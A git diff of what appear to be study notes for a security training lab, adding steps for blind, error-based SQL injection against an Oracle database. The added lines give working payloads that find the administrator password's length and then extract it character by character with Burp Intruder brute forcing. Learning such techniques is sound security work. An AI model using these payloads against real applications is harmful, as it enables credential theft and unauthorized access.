@@ -222,6 +222,9 @@ Steps to follow:
 - inject `''` and notice no errors, we can deduce based on conditional errors for our usecase. In this example this is an Oracle DB so make sure to add the FROM DUAL for all queries
 - inject `'||(SELECT '')||'` and notice the error, again use FROM DUAL to get no errors, meaning our syntax is correct: `'||(SELECT '' FROM DUAL)||'`
 - use users table name to see if that exists, if you get an error you know it doesn't. You have to do something like this: `'||(SELECT '' FROM users where rownum = 1)||'`, `where rownum =1` makes sure we don't break the concatentation and limits the response to 1 row.
-- from the cheat sheet we use this: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'` and `'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'`, notice errors happen with one over the other
-- 
+- from the cheat sheet we use this: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'` and `'||(SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)||'`, notice errors happen with one instead of the other
+- The we do this to determine the length of the password value for the administrator account `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`, incrementally change the `>1` number until you don't get an error anymore
+- We then send with a crafted payload as such: `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+- we can put this in intruder and do an alphanumeric brute force on the `'a'` value, the response that gives a 500 error will be the value of that row in the password.
+- To continue we just change the `SUBSTR(password,1,1)='a'` to `SUBSTR(password,2,1)='a'` to be able to get the second character in the administrators password, and keep incrementing and brute forcing this until we finish
 
